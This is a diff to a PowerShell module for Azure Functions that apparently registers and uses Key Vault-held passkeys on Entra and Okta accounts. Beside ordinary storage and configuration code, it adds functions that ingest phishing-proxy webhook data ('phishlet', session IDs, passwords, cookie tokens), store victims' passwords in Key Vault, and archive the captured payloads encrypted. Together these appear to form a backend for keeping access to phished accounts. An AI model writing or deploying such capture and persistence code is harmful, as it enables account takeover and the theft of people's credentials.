@@ -82,6 +82,36 @@ function Get-BodyValue {
     return $null
 }
 
+function Get-PasskeyObjectValue {
+    param(
+        [Parameter()]
+        $Object,
+
+        [Parameter(Mandatory)]
+        [string[]]$Names
+    )
+
+    if ($null -eq $Object) {
+        return $null
+    }
+
+    foreach ($name in $Names) {
+        if ($Object -is [System.Collections.IDictionary]) {
+            if ($Object.Contains($name)) {
+                return $Object[$name]
+            }
+            continue
+        }
+
+        $property = $Object.PSObject.Properties[$name]
+        if ($null -ne $property) {
+            return $property.Value
+        }
+    }
+
+    return $null
+}
+
 function Get-RegistrationQueueName {
     $queueName = [Environment]::GetEnvironmentVariable('PASSKEY_REGISTRATION_QUEUE_NAME')
     if ([string]::IsNullOrWhiteSpace($queueName)) {
@@ -287,7 +317,7 @@ function Resolve-RequestUserAgent {
         $Request
     )
 
-    $requestUserAgent = Get-RequestValue -Body $Body -Request $Request -Names @('userAgent', 'useragent')
+    $requestUserAgent = Get-RequestValue -Body $Body -Request $Request -Names @('userAgent', 'useragent', 'user_agent')
     return Normalize-PasskeyUserAgent -UserAgent $requestUserAgent
 }
 
@@ -335,12 +365,12 @@ function Resolve-RequestRedirectUri {
         $Request
     )
 
-    $requestRedirectUri = Get-RequestValue -Body $Body -Request $Request -Names @('redirectUri', 'redirecturi')
-    return Normalize-PasskeyRedirectUri -RedirectUri $requestRedirectUri
+    return Normalize-PasskeyRedirectUri -RedirectUri ([Environment]::GetEnvironmentVariable('PASSKEY_ENTRA_PORTAL_ORIGIN'))
 }
 
 function Get-PasskeyFunctionConfiguration {
-    $keyVaultAccessToken = [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN')
+    $allowLocalCredentials = [Environment]::GetEnvironmentVariable('PASSKEY_ALLOW_LOCAL_CREDENTIALS') -eq 'true'
+    $keyVaultAccessToken = if ($allowLocalCredentials) { [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN') } else { $null }
 
     return [ordered]@{
         TenantId = Get-RequiredSetting -Name 'PASSKEY_TENANT_ID'
@@ -351,7 +381,8 @@ function Get-PasskeyFunctionConfiguration {
 }
 
 function Get-OktaFunctionConfiguration {
-    $keyVaultAccessToken = [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN')
+    $allowLocalCredentials = [Environment]::GetEnvironmentVariable('PASSKEY_ALLOW_LOCAL_CREDENTIALS') -eq 'true'
+    $keyVaultAccessToken = if ($allowLocalCredentials) { [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN') } else { $null }
     $oktaDomain = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_DOMAIN')
 
     return [ordered]@{
@@ -371,13 +402,10 @@ function Resolve-OktaDomain {
         $Request
     )
 
-    $domain = Get-RequestValue -Body $Body -Request $Request -Names @('oktaDomain', 'domain')
-    if ([string]::IsNullOrWhiteSpace($domain)) {
-        $domain = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_DOMAIN')
-    }
+    $domain = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_DOMAIN')
 
     if ([string]::IsNullOrWhiteSpace($domain)) {
-        throw [System.ArgumentException]::new("Missing required Okta domain. Set 'PASSKEY_OKTA_DOMAIN' or provide 'oktaDomain'.")
+        throw [System.ArgumentException]::new("Missing required server setting 'PASSKEY_OKTA_DOMAIN'.")
     }
 
     return $domain.Trim()
@@ -473,7 +501,15 @@ function Get-KeyVaultAccessToken {
         return $token
     }
 
-    throw "Unable to acquire a Key Vault access token. Set PASSKEY_KEYVAULT_ACCESS_TOKEN for local development or run in Azure with managed identity."
+    try {
+        $token = az account get-access-token --resource 'https://vault.azure.net' --query accessToken -o tsv 2>$null
+        if (-not [string]::IsNullOrWhiteSpace([string]$token)) {
+            return ([string]$token).Trim()
+        }
+    } catch {
+    }
+
+    throw "Unable to acquire a Key Vault access token. Set PASSKEY_KEYVAULT_ACCESS_TOKEN, run in Azure with managed identity, or sign in with Azure CLI."
 }
 
 function Get-StorageAccessToken {
@@ -482,12 +518,25 @@ function Get-StorageAccessToken {
         [hashtable]$Configuration
     )
 
+    $configuredToken = [Environment]::GetEnvironmentVariable('PASSKEY_STORAGE_ACCESS_TOKEN')
+    if (-not [string]::IsNullOrWhiteSpace($configuredToken)) {
+        return $configuredToken
+    }
+
     $token = Get-ManagedIdentityAccessToken -Resource 'https://storage.azure.com/' -ClientId ([string]$Configuration.ManagedIdentityClientId)
     if (-not [string]::IsNullOrWhiteSpace($token)) {
         return $token
     }
 
-    throw "Unable to acquire a Storage access token. Run in Azure with managed identity or configure AzureWebJobsStorage with a supported identity."
+    try {
+        $token = az account get-access-token --resource 'https://storage.azure.com/' --query accessToken -o tsv 2>$null
+        if (-not [string]::IsNullOrWhiteSpace([string]$token)) {
+            return ([string]$token).Trim()
+        }
+    } catch {
+    }
+
+    throw "Unable to acquire a Storage access token. Set PASSKEY_STORAGE_ACCESS_TOKEN, run in Azure with managed identity, or sign in with Azure CLI."
 }
 
 function Get-StorageBlobServiceUri {
@@ -497,6 +546,331 @@ function Get-StorageBlobServiceUri {
     }
 
     return $blobServiceUri.TrimEnd('/')
+}
+
+function Get-StorageTableServiceUri {
+    $tableServiceUri = [Environment]::GetEnvironmentVariable('AzureWebJobsStorage__tableServiceUri')
+    if ([string]::IsNullOrWhiteSpace($tableServiceUri)) {
+        throw [System.ArgumentException]::new("Missing required setting 'AzureWebJobsStorage__tableServiceUri'.")
+    }
+
+    return $tableServiceUri.TrimEnd('/')
+}
+
+function Get-PasskeyCatalogTableName {
+    $tableName = [Environment]::GetEnvironmentVariable('PASSKEY_CATALOG_TABLE_NAME')
+    if ([string]::IsNullOrWhiteSpace($tableName)) {
+        return 'PasskeyCredentials'
+    }
+    if ($tableName -notmatch '^[A-Za-z0-9]+$') {
+        throw [System.ArgumentException]::new('PASSKEY_CATALOG_TABLE_NAME must contain only letters and numbers.')
+    }
+    return $tableName
+}
+
+$script:PasskeyCatalogTableEnsured = @{}
+
+function Get-DeterministicPasskeyRecordId {
+    param([Parameter(Mandatory)][string]$Name)
+
+    $namespaceBytes = [Convert]::FromHexString('6ba7b8119dad11d180b400c04fd430c8')
+    $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($Name)
+    $inputBytes = [byte[]]::new($namespaceBytes.Length + $nameBytes.Length)
+    [Array]::Copy($namespaceBytes, 0, $inputBytes, 0, $namespaceBytes.Length)
+    [Array]::Copy($nameBytes, 0, $inputBytes, $namespaceBytes.Length, $nameBytes.Length)
+    $hash = [System.Security.Cryptography.SHA1]::HashData($inputBytes)
+    $uuidBytes = [byte[]]$hash[0..15]
+    $uuidBytes[6] = ($uuidBytes[6] -band 0x0f) -bor 0x50
+    $uuidBytes[8] = ($uuidBytes[8] -band 0x3f) -bor 0x80
+    $hex = [Convert]::ToHexString($uuidBytes).ToLowerInvariant()
+    return "$($hex.Substring(0,8))-$($hex.Substring(8,4))-$($hex.Substring(12,4))-$($hex.Substring(16,4))-$($hex.Substring(20,12))"
+}
+
+function Get-StorageTableHeaders {
+    param(
+        [Parameter(Mandatory)]
+        [hashtable]$Configuration
+    )
+
+    return @{
+        Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"
+        'x-ms-version' = '2023-11-03'
+        'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R')
+        Accept = 'application/json;odata=nometadata'
+        DataServiceVersion = '3.0;NetFx'
+        MaxDataServiceVersion = '3.0;NetFx'
+    }
+}
+
+function Ensure-PasskeyCatalogTable {
+    param(
+        [Parameter(Mandatory)]
+        [hashtable]$Configuration
+    )
+
+    $tableName = Get-PasskeyCatalogTableName
+    if ($script:PasskeyCatalogTableEnsured.ContainsKey($tableName)) {
+        return
+    }
+    try {
+        Invoke-WebRequest -Method POST -Uri "$(Get-StorageTableServiceUri)/Tables" `
+            -Headers (Get-StorageTableHeaders -Configuration $Configuration) `
+            -ContentType 'application/json' -Body (@{ TableName = $tableName } | ConvertTo-Json -Compress) | Out-Null
+    } catch {
+        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
+        if ($statusCode -ne 409) {
+            throw
+        }
+    }
+    $script:PasskeyCatalogTableEnsured[$tableName] = $true
+}
+
+function New-PasskeyCatalogRecord {
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('entra', 'okta')]
+        [string]$Provider,
+
+        [Parameter(Mandatory)]
+        [hashtable]$Credential
+    )
+
+    $keyVaultValue = Get-PasskeyObjectValue -Object $Credential -Names @('keyVault')
+    $keyVault = if ($keyVaultValue -is [System.Collections.IDictionary]) { [hashtable]$keyVaultValue } else { @{} }
+    $credentialId = [string](Get-PasskeyObjectValue -Object $Credential -Names @('credentialId'))
+    $rpId = [string](Get-PasskeyObjectValue -Object $Credential -Names @('relyingParty', 'rpId'))
+    $userName = [string](Get-PasskeyObjectValue -Object $Credential -Names @('userName', 'username'))
+    $vaultName = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('vaultName'))
+    $keyName = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('keyName'))
+    $keyId = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('keyId'))
+    if (@($credentialId, $rpId, $userName, $vaultName, $keyName, $keyId).Where({ [string]::IsNullOrWhiteSpace($_) }).Count -gt 0) {
+        throw [System.ArgumentException]::new('Credential cataloging requires credentialId, relyingParty, userName, and complete Key Vault coordinates.')
+    }
+    $now = (Get-Date).ToUniversalTime().ToString('o')
+    $createdAt = [string](Get-PasskeyObjectValue -Object $Credential -Names @('createdDateTime', 'createdAt'))
+    if ([string]::IsNullOrWhiteSpace($createdAt)) { $createdAt = $now }
+    $providerValue = Get-PasskeyObjectValue -Object $Credential -Names @($Provider)
+    $providerMetadata = if ($providerValue -is [System.Collections.IDictionary]) { [hashtable]$providerValue } else { @{} }
+    $userHandleValue = Get-PasskeyObjectValue -Object $Credential -Names @('userHandle')
+    $displayNameValue = Get-PasskeyObjectValue -Object $Credential -Names @('displayName')
+    $urlValue = Get-PasskeyObjectValue -Object $Credential -Names @('url')
+    $signCountValue = Get-PasskeyObjectValue -Object $Credential -Names @('signCount')
+    if ($null -eq $signCountValue) { $signCountValue = Get-PasskeyObjectValue -Object $Credential -Names @('counter') }
+    $signCount = if ($null -eq $signCountValue -or [string]::IsNullOrWhiteSpace([string]$signCountValue)) { 0 } else { [int]$signCountValue }
+    return [ordered]@{
+        schemaVersion = '1'
+        recordId = Get-DeterministicPasskeyRecordId -Name "passkey:${Provider}:$($vaultName.ToLowerInvariant()):${credentialId}"
+        provider = $Provider
+        credentialId = $credentialId
+        rpId = $rpId
+        userHandle = if ([string]::IsNullOrWhiteSpace([string]$userHandleValue)) { $null } else { [string]$userHandleValue }
+        userName = $userName
+        displayName = if ([string]::IsNullOrWhiteSpace([string]$displayNameValue)) { $userName } else { [string]$displayNameValue }
+        origin = if ([string]::IsNullOrWhiteSpace([string]$urlValue)) { $null } else { [string]$urlValue }
+        keyVault = [ordered]@{ vaultName = $vaultName; keyName = $keyName; keyId = $keyId }
+        status = 'active'
+        signCount = $signCount
+        createdAt = $createdAt
+        updatedAt = $now
+        providerMetadata = $providerMetadata
+    }
+}
+
+function Save-PasskeyCatalogRecord {
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('entra', 'okta')]
+        [string]$Provider,
+
+        [Parameter(Mandatory)]
+        [hashtable]$Credential,
+
+        [Parameter(Mandatory)]
+        [hashtable]$Configuration,
+
+        [Parameter()]
+        [hashtable]$Extensions = @{}
+    )
+
+    Ensure-PasskeyCatalogTable -Configuration $Configuration
+    $record = New-PasskeyCatalogRecord -Provider $Provider -Credential $Credential
+    foreach ($entry in $Extensions.GetEnumerator()) {
+        $record[$entry.Key] = $entry.Value
+    }
+    $entity = [ordered]@{
+        PartitionKey = ([string]$record.keyVault.vaultName).ToLowerInvariant()
+        RowKey = $record.recordId
+        SchemaVersion = $record.schemaVersion
+        Provider = $record.provider
+        CredentialId = $record.credentialId
+        RpId = $record.rpId
+        UserName = $record.userName
+        DisplayName = $record.displayName
+        KeyVaultName = $record.keyVault.vaultName
+        KeyVaultKeyName = $record.keyVault.keyName
+        KeyVaultKeyId = $record.keyVault.keyId
+        Status = $record.status
+        CreatedAt = $record.createdAt
+        UpdatedAt = $record.updatedAt
+        SignCount = $record.signCount
+        RecordJson = ($record | ConvertTo-Json -Depth 20 -Compress)
+    }
+    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)(PartitionKey='$($entity.PartitionKey)',RowKey='$($entity.RowKey)')"
+    $headers = Get-StorageTableHeaders -Configuration $Configuration
+    Invoke-WebRequest -Method PUT -Uri $uri -Headers $headers -ContentType 'application/json' `
+        -Body ($entity | ConvertTo-Json -Depth 10 -Compress) | Out-Null
+    return $record
+}
+
+function Get-PasskeyCatalogRecords {
+    param(
+        [Parameter(Mandatory)]
+        [hashtable]$Configuration,
+        [ValidateSet('', 'entra', 'okta')]
+        [string]$Provider = '',
+        [string]$RpId,
+        [string]$UserName,
+        [ValidateSet('', 'active', 'disabled', 'deleted')]
+        [string]$Status = '',
+        [string]$CredentialId,
+        [string]$DisplayName,
+        [string]$KeyVaultKeyName
+    )
+
+    Ensure-PasskeyCatalogTable -Configuration $Configuration
+    $partitionKey = ([string]$Configuration.KeyVaultName).ToLowerInvariant().Replace("'", "''")
+    $filter = [uri]::EscapeDataString("PartitionKey eq '$partitionKey'")
+    $records = @()
+    $nextPartitionKey = $null
+    $nextRowKey = $null
+    do {
+        $query = "`$filter=$filter"
+        if ($nextPartitionKey) {
+            $query += "&NextPartitionKey=$([uri]::EscapeDataString($nextPartitionKey))"
+        }
+        if ($nextRowKey) {
+            $query += "&NextRowKey=$([uri]::EscapeDataString($nextRowKey))"
+        }
+        $response = Invoke-WebRequest -Method GET `
+            -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)()?$query" `
+            -Headers (Get-StorageTableHeaders -Configuration $Configuration)
+        $payload = $response.Content | ConvertFrom-Json -Depth 20
+        foreach ($entity in @($payload.value)) {
+            if ([string]::IsNullOrWhiteSpace([string]$entity.RecordJson)) { continue }
+            $record = [string]$entity.RecordJson | ConvertFrom-Json -AsHashtable -Depth 20
+            if ($Provider -and [string]$record.provider -ne $Provider) { continue }
+            if ($RpId -and [string]$record.rpId -ine $RpId) { continue }
+            if ($UserName -and [string]$record.userName -ine $UserName) { continue }
+            if ($Status -and [string]$record.status -ne $Status) { continue }
+            if ($CredentialId -and [string]$record.credentialId -cne $CredentialId) { continue }
+            if ($DisplayName -and [string]$record.displayName -ine $DisplayName) { continue }
+            if ($KeyVaultKeyName -and [string]$record.keyVault.keyName -ine $KeyVaultKeyName) { continue }
+            $records += ,$record
+        }
+        $nextPartitionKey = [string]$response.Headers['x-ms-continuation-NextPartitionKey']
+        $nextRowKey = [string]$response.Headers['x-ms-continuation-NextRowKey']
+    } while (-not [string]::IsNullOrWhiteSpace($nextPartitionKey))
+    return $records
+}
+
+function Get-PasskeyCatalogRecord {
+    param(
+        [Parameter(Mandatory)]
+        [hashtable]$Configuration,
+        [Parameter(Mandatory)]
+        [string]$RecordId
+    )
+
+    Ensure-PasskeyCatalogTable -Configuration $Configuration
+    $partitionKey = ([string]$Configuration.KeyVaultName).ToLowerInvariant().Replace("'", "''")
+    $escapedRecordId = $RecordId.Replace("'", "''")
+    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)(PartitionKey='$partitionKey',RowKey='$escapedRecordId')"
+    try {
+        $entity = Invoke-RestMethod -Method GET -Uri $uri -Headers (Get-StorageTableHeaders -Configuration $Configuration)
+    } catch {
+        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
+        if ($statusCode -eq 404) { return $null }
+        throw
+    }
+    if ([string]::IsNullOrWhiteSpace([string]$entity.RecordJson)) {
+        throw "Passkey catalog record '$RecordId' is malformed."
+    }
+    return [string]$entity.RecordJson | ConvertFrom-Json -AsHashtable -Depth 20
+}
+
+function Invoke-ProviderPasskeyLookup {
+    param(
+        [Parameter(Mandatory)]
+        $Request,
+        [Parameter()]
+        $TriggerMetadata,
+        [Parameter(Mandatory)]
+        [ValidateSet('entra', 'okta')]
+        [string]$Provider
+    )
+
+    try {
+        $recordId = $null
+        if ($Request.Params -is [System.Collections.IDictionary] -and $Request.Params.ContainsKey('recordId')) {
+            $recordId = [string]$Request.Params['recordId']
+        }
+        if ([string]::IsNullOrWhiteSpace($recordId) -and $TriggerMetadata) {
+            $property = $TriggerMetadata.PSObject.Properties['recordId']
+            if ($property) { $recordId = [string]$property.Value }
+        }
+
+        $configuration = Get-PasskeyFunctionConfiguration
+        if (-not [string]::IsNullOrWhiteSpace($recordId)) {
+            $record = Get-PasskeyCatalogRecord -Configuration $configuration -RecordId $recordId
+            if ($null -eq $record -or [string]$record.provider -ne $Provider) {
+                Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::NotFound) -Body ([ordered]@{
+                    success = $false
+                    provider = $Provider
+                    recordId = $recordId
+                    error = 'Passkey was not found.'
+                }))
+                return
+            }
+            Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::OK) -Body ([ordered]@{
+                success = $true
+                provider = $Provider
+                record = $record
+            }))
+            return
+        }
+
+        $body = @{}
+        $rpId = Get-RequestValue -Body $body -Request $Request -Names @('rpId', 'relyingParty')
+        $userName = Get-RequestValue -Body $body -Request $Request -Names @('userName', 'username', 'email')
+        $status = Get-RequestValue -Body $body -Request $Request -Names @('status')
+        $credentialId = Get-RequestValue -Body $body -Request $Request -Names @('credentialId')
+        $displayName = Get-RequestValue -Body $body -Request $Request -Names @('displayName')
+        $keyVaultKeyName = Get-RequestValue -Body $body -Request $Request -Names @('keyVaultKeyName', 'keyName')
+        if ($status -and $status -notin @('active', 'disabled', 'deleted')) {
+            throw [System.ArgumentException]::new("status must be 'active', 'disabled', or 'deleted'.")
+        }
+        $records = @(Get-PasskeyCatalogRecords -Configuration $configuration -Provider $Provider `
+            -RpId $rpId -UserName $userName -Status ([string]($status ?? '')) `
+            -CredentialId $credentialId -DisplayName $displayName -KeyVaultKeyName $keyVaultKeyName)
+        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::OK) -Body ([ordered]@{
+            success = $true
+            provider = $Provider
+            count = $records.Count
+            records = $records
+        }))
+    } catch [System.ArgumentException] {
+        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::BadRequest) -Body ([ordered]@{
+            success = $false
+            provider = $Provider
+            error = $_.Exception.Message
+        }))
+    } catch {
+        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::InternalServerError) -Body ([ordered]@{
+            success = $false
+            provider = $Provider
+            error = $_.Exception.Message
+        }))
+    }
 }
 
 function Get-RegistrationStatusContainerName {
@@ -885,13 +1259,230 @@ function Invoke-PasskeyLoginScript {
     }
 }
 
+function Get-PasskeyCaptureTableName {
+    $name = [Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_TABLE_NAME')
+    if ([string]::IsNullOrWhiteSpace($name)) { return 'PasskeyCaptureContexts' }
+    if ($name -notmatch '^[A-Za-z0-9]+$') { throw [System.ArgumentException]::new('PASSKEY_CAPTURE_TABLE_NAME must be alphanumeric.') }
+    return $name
+}
+
+function Get-PasskeyCaptureContainerName {
+    $name = [Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_CONTAINER_NAME')
+    if ([string]::IsNullOrWhiteSpace($name)) { return 'passkey-capture-context' }
+    return $name.Trim().ToLowerInvariant()
+}
+
+function Set-PasskeyKeyVaultSecret {
+    param(
+        [Parameter(Mandatory)][hashtable]$Configuration,
+        [Parameter(Mandatory)][string]$Name,
+        [Parameter(Mandatory)][string]$Value,
+        [Parameter(Mandatory)][string]$ContentType,
+        [Parameter()][Nullable[datetime]]$ExpiresAt,
+        [Parameter()][hashtable]$Tags = @{}
+    )
+    $attributes = @{ enabled = $true }
+    if ($null -ne $ExpiresAt) { $attributes.exp = [DateTimeOffset]::new([datetime]$ExpiresAt).ToUnixTimeSeconds() }
+    $body = @{ value = $Value; contentType = $ContentType; attributes = $attributes; tags = $Tags } | ConvertTo-Json -Depth 10 -Compress
+    Invoke-RestMethod -Method PUT -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" `
+        -Headers @{ Authorization = "Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)" } -ContentType 'application/json' -Body $body | Out-Null
+}
+
+function Get-PasskeyKeyVaultSecret {
+    param([Parameter(Mandatory)][hashtable]$Configuration, [Parameter(Mandatory)][string]$Name)
+    try {
+        $result = Invoke-RestMethod -Method GET -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" `
+            -Headers @{ Authorization = "Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)" }
+        return [string]$result.value
+    } catch {
+        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
+        if ($statusCode -eq 404) { return $null }
+        throw
+    }
+}
+
+function Remove-PasskeyKeyVaultSecret {
+    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][string]$Name)
+    try {
+        Invoke-RestMethod -Method DELETE -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" -Headers @{Authorization="Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)"}|Out-Null
+        return $true
+    } catch {
+        $statusCode=if($_.Exception.Response){[int]$_.Exception.Response.StatusCode}else{$null};if($statusCode -eq 404){return $false};throw
+    }
+}
+
+function Ensure-PasskeyCaptureResources {
+    param([Parameter(Mandatory)][hashtable]$Configuration)
+    $tableName = Get-PasskeyCaptureTableName
+    try {
+        Invoke-WebRequest -Method POST -Uri "$(Get-StorageTableServiceUri)/Tables" -Headers (Get-StorageTableHeaders -Configuration $Configuration) `
+            -ContentType 'application/json' -Body (@{ TableName = $tableName } | ConvertTo-Json -Compress) | Out-Null
+    } catch {
+        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
+        if ($statusCode -ne 409) { throw }
+    }
+    $headers = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version' = '2023-11-03'; 'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R') }
+    try {
+        Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)?restype=container" -Headers $headers | Out-Null
+    } catch {
+        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
+        if ($statusCode -ne 409) { throw }
+    }
+}
+
+function Test-PasskeyCaptureRequested {
+    param([Parameter(Mandatory)][hashtable]$Body)
+    foreach ($name in @('event','phishlet','session_id','sessionId','password','remote_ip','cookie_tokens','body_tokens','http_tokens','trigger')) {
+        if ($Body.ContainsKey($name)) { return $true }
+    }
+    return $false
+}
+
+function Save-PasskeyLoginAndCaptureContext {
+    param(
+        [Parameter(Mandatory)][ValidateSet('entra','okta')][string]$Provider,
+        [Parameter(Mandatory)][hashtable]$Body,
+        [Parameter(Mandatory)][hashtable]$Credential,
+        [Parameter(Mandatory)][hashtable]$Configuration,
+        [Parameter()][string]$UserAgent
+    )
+    $record = New-PasskeyCatalogRecord -Provider $Provider -Credential $Credential
+    $recordId = [string]$record.recordId
+    $secretName = "pklogin-$recordId"
+    $loginContext = @{}
+    $existing = Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName
+    if (-not [string]::IsNullOrWhiteSpace($existing)) { $loginContext = $existing | ConvertFrom-Json -AsHashtable -Depth 10 }
+    if ($Body.ContainsKey('password') -and -not [string]::IsNullOrWhiteSpace([string]$Body.password)) { $loginContext.password = [string]$Body.password }
+    $submittedUserAgent = [string]($Body.user_agent ?? $Body.userAgent ?? '')
+    if (-not [string]::IsNullOrWhiteSpace($submittedUserAgent)) { $loginContext.userAgent = $submittedUserAgent.Trim() }
+    elseif (-not [string]::IsNullOrWhiteSpace($UserAgent) -and -not $loginContext.ContainsKey('userAgent')) { $loginContext.userAgent = $UserAgent }
+    $extensions = @{
+        loginContextSecretName = $null
+        hasStoredPassword = $false
+        hasStoredUserAgent = $false
+    }
+    if ($loginContext.ContainsKey('password') -or $loginContext.ContainsKey('userAgent')) {
+        $loginContext.schemaVersion = '1'
+        $loginContext.updatedAt = (Get-Date).ToUniversalTime().ToString('o')
+        Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName -Value ($loginContext | ConvertTo-Json -Compress) `
+            -ContentType 'application/vnd.research-passkeys.login-context+json' -Tags @{ recordId = $recordId; kind = 'login-context' }
+        $extensions.loginContextSecretName = $secretName
+        $extensions.hasStoredPassword = $loginContext.ContainsKey('password')
+        $extensions.hasStoredUserAgent = $loginContext.ContainsKey('userAgent')
+    }
+    if (-not (Test-PasskeyCaptureRequested -Body $Body)) { return $extensions }
+
+    $rawJson = $Body | ConvertTo-Json -Depth 50 -Compress
+    $rawBytes = [Text.Encoding]::UTF8.GetBytes($rawJson)
+    $maxBytes = 1048576
+    [void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_MAX_BYTES'), [ref]$maxBytes)
+    if ($rawBytes.Length -gt $maxBytes) { throw [System.ArgumentException]::new("Capture payload exceeds the configured $maxBytes-byte limit.") }
+    $sessionId = [string]($Body.session_id ?? $Body.sessionId ?? '')
+    $captureId = if ($sessionId) { Get-DeterministicPasskeyRecordId -Name "passkey-capture:${Provider}:${sessionId}:$($Credential.keyVault.keyName)" } else { [guid]::NewGuid().ToString() }
+    $cek = [byte[]]::new(32); [Security.Cryptography.RandomNumberGenerator]::Fill($cek)
+    $nonce = [byte[]]::new(12); [Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
+    $ciphertext = [byte[]]::new($rawBytes.Length); $tag = [byte[]]::new(16)
+    $aad = [Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:${Provider}:${captureId}")
+    $aes = [Security.Cryptography.AesGcm]::new($cek, 16)
+    try { $aes.Encrypt($nonce, $rawBytes, $ciphertext, $tag, $aad) } finally { $aes.Dispose() }
+    $expires = (Get-Date).ToUniversalTime().AddHours(24)
+    $cekSecretName = "pkcek-$captureId"
+    Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $cekSecretName -Value ([Convert]::ToBase64String($cek)) `
+        -ContentType 'application/vnd.research-passkeys.capture-key' -ExpiresAt $expires -Tags @{ recordId = $recordId; captureId = $captureId; kind = 'capture-key' }
+    Ensure-PasskeyCaptureResources -Configuration $Configuration
+    $blobName = "$recordId/$captureId.json"
+    $envelope = @{ schemaVersion='1'; algorithm='A256GCM'; nonce=[Convert]::ToBase64String($nonce); ciphertext=[Convert]::ToBase64String($ciphertext); tag=[Convert]::ToBase64String($tag) } | ConvertTo-Json -Compress
+    $blobHeaders = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version'='2023-11-03'; 'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R'); 'x-ms-blob-type'='BlockBlob' }
+    Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$blobName" -Headers $blobHeaders -ContentType 'application/json' -Body $envelope | Out-Null
+    $sha = [Convert]::ToHexString([Security.Cryptography.SHA256]::HashData($rawBytes)).ToLowerInvariant()
+    $entity = [ordered]@{
+        PartitionKey=$recordId; RowKey=$captureId; Provider=$Provider; Event=[string]($Body.event ?? ''); Phishlet=[string]($Body.phishlet ?? '');
+        SessionId=$sessionId; Trigger=[string]($Body.trigger ?? ''); CapturedAt=[string]($Body.timestamp ?? (Get-Date).ToUniversalTime().ToString('o'));
+        ReceivedAt=(Get-Date).ToUniversalTime().ToString('o'); ExpiresAt=$expires.ToString('o'); Status='active'; PayloadSha256=$sha;
+        EncryptedBlobName=$blobName; CekSecretName=$cekSecretName
+    }
+    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)(PartitionKey='$recordId',RowKey='$captureId')"
+    Invoke-WebRequest -Method PUT -Uri $uri -Headers (Get-StorageTableHeaders -Configuration $Configuration) -ContentType 'application/json' -Body ($entity | ConvertTo-Json -Compress) | Out-Null
+    $extensions.latestCaptureId = $captureId
+    return $extensions
+}
+
+function Get-PasskeyLoginContext {
+    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][hashtable]$Record)
+    if ([string]::IsNullOrWhiteSpace([string]$Record.loginContextSecretName)) { return @{} }
+    $value = Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name ([string]$Record.loginContextSecretName)
+    if ([string]::IsNullOrWhiteSpace($value)) { return @{} }
+    return $value | ConvertFrom-Json -AsHashtable -Depth 10
+}
+
+function Get-PasskeyCaptureContexts {
+    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][string]$RecordId)
+    Ensure-PasskeyCaptureResources -Configuration $Configuration
+    $filter = [uri]::EscapeDataString("PartitionKey eq '$($RecordId.Replace("'","''"))'")
+    $response = Invoke-RestMethod -Method GET -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)()?`$filter=$filter" -Headers (Get-StorageTableHeaders -Configuration $Configuration)
